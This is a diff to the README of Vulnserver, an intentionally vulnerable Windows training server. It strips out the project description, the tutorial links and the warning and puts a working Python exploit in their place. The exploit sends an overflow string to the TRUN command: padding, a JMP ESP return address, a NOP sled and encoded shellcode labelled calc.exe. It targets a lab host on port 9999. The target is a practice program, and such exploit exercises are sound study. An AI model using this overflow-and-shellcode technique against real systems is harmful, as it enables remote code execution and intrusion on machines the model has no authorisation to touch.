@@ -1,48 +1,38 @@
-# Vulnserver
-
-Check my blog at http://www.thegreycorner.com/ for more information and updates to this software.
-
-## About the software
-
-Vulnserver is a multithreaded Windows based TCP server that listens for client connections on port 9999 (by default) and allows the user to run a number of different commands that are vulnerable to various types of exploitable buffer overflows.
-
-This software is intended mainly as a tool for learning how to find and exploit buffer overflow bugs, and each of the bugs it contains is subtly different from the others, requiring a slightly different approach to be taken when writing the exploit.
-
-Though it does make an attempt to mimic a (simple) legitimate server program this software has no functional use beyond that of acting as an exploit target, and this software should not generally be run by anyone who is not using it as a learning tool.
-
-
-## Compiling the software
-
-
-Binaries have been provided in this package, however if you wish to compile the software from the provided source files instructions are included in the file COMPILING.txt.
-
-## Running the software
-
-To run the software, simply execute vulnserver.exe.  The provided essfunc.dll library must be in a location where it can be found by vulnserver.exe - keeping both files in the same directory will usually work fine.
-
-To start the server listening on the default port of 9999, simply run the executable, to use an alternate port, provide the port number as a command line parameter.
-
-Once the software is running, simply connect to it on port 9999 using a command line client like netcat.  Issue a HELP command (case sensitive) to see what functions are supported and go from there....
-
 ## Exploiting Vulnserver
+```python 
+#!/usr/bin/python
+# Tested on Microsoft Windows 7 Enterprise
 
-Detailed instructions on how to exploit this software, or example exploit files have not been included with this package - this is to provide a challenge for those who want it and also a disincentive to cheat by peeking at the answer.  
+import socket
 
-If you're stuck, you can refer to the following to get an idea of how to proceed. Some of the following links provide full tutorials that teach the skills necessary to exploit and discover the vulnerabilities in Vulnserver, along with complete walkthroughs for some of the simpler vulnerabilities. In the case of the more difficult issues, some of the links might provide just a hint of how you can proceed...
+buf = "TRUN /.:/"
+buf += "\x41" * 2003 # EIP 386F4337
+buf += "\xaf\x11\x50\x62" #JMP ESP 
+buf += "\x90" * 30 #NOP Sledges
+buf += ("\xda\xd5\xb8\x7d\xb3\x4c\x5e\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
+"\x31\x31\x47\x18\x83\xc7\x04\x03\x47\x69\x51\xb9\xa2\x79\x17"
+"\x42\x5b\x79\x78\xca\xbe\x48\xb8\xa8\xcb\xfa\x08\xba\x9e\xf6"
+"\xe3\xee\x0a\x8d\x86\x26\x3c\x26\x2c\x11\x73\xb7\x1d\x61\x12"
+"\x3b\x5c\xb6\xf4\x02\xaf\xcb\xf5\x43\xd2\x26\xa7\x1c\x98\x95"
+"\x58\x29\xd4\x25\xd2\x61\xf8\x2d\x07\x31\xfb\x1c\x96\x4a\xa2"
+"\xbe\x18\x9f\xde\xf6\x02\xfc\xdb\x41\xb8\x36\x97\x53\x68\x07"
+"\x58\xff\x55\xa8\xab\x01\x91\x0e\x54\x74\xeb\x6d\xe9\x8f\x28"
+"\x0c\x35\x05\xab\xb6\xbe\xbd\x17\x47\x12\x5b\xd3\x4b\xdf\x2f"
+"\xbb\x4f\xde\xfc\xb7\x6b\x6b\x03\x18\xfa\x2f\x20\xbc\xa7\xf4"
+"\x49\xe5\x0d\x5a\x75\xf5\xee\x03\xd3\x7d\x02\x57\x6e\xdc\x48"
+"\xa6\xfc\x5a\x3e\xa8\xfe\x64\x6e\xc1\xcf\xef\xe1\x96\xcf\x25"
+"\x46\x68\x9a\x64\xee\xe1\x43\xfd\xb3\x6f\x74\x2b\xf7\x89\xf7"
+"\xde\x87\x6d\xe7\xaa\x82\x2a\xaf\x47\xfe\x23\x5a\x68\xad\x44"
+"\x4f\x0b\x30\xd7\x13\xe2\xd7\x5f\xb1\xfa") #calc.exe
 
-* [An Introduction to Fuzzing: Using SPIKE to find vulnerabilities in Vulnserver](http://www.thegreycorner.com/2010/12/introduction-to-fuzzing-using-spike-to.html)
-* [Exploit Writers Debugging Tutorial](http://www.thegreycorner.com/2011/03/exploit-writers-debugging-tutorial.html)
-* [Simple Stack Based Buffer Overflow Tutorial for Vulnserver](http://www.thegreycorner.com/2011/03/simple-stack-based-buffer-overflow.html)
-* [SEH Based Buffer Overflow Tutorial for Vulnserver](http://www.thegreycorner.com/2011/06/seh-based-buffer-overflow-tutorial-for.html)
-* [Egghunter based exploit for Vulnserver](http://www.thegreycorner.com/2011/10/egghunter-based-exploit-for-vulnserver.html)
-* [Restricted Character Set Buffer Overflow Tutorial for Vulnserver](http://www.thegreycorner.com/2011/12/restricted-character-set-buffer.html)
-* [Omlette Egghunter Shellcode](http://www.thegreycorner.com/2013/10/omlette-egghunter-shellcode.html)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('192.168.56.104',9999)) # connect to FTP Server
+s.send(buf + '\r\n') 
+response = s.recv(1024)
+s.close()
+```
 
 
-## License
 
-See LICENSE.txt.
 
-## Warning
 
-UNDER NO CIRCUMSTANCES SHOULD THIS SOFTWARE BE RUN ON ANY SYSTEM THAT IS CONNECTED TO AN UNTRUSTED NETWORK OR THAT PERFORMS CRITICAL FUNCTIONS.  THE AUTHOR IS NOT RESPONSIBLE FOR ANY DAMAGES THAT MAY OCCUR FROM USING THIS SOFTWARE IN THIS OR ANY OTHER MANNER.  USE AT YOUR OWN RISK.
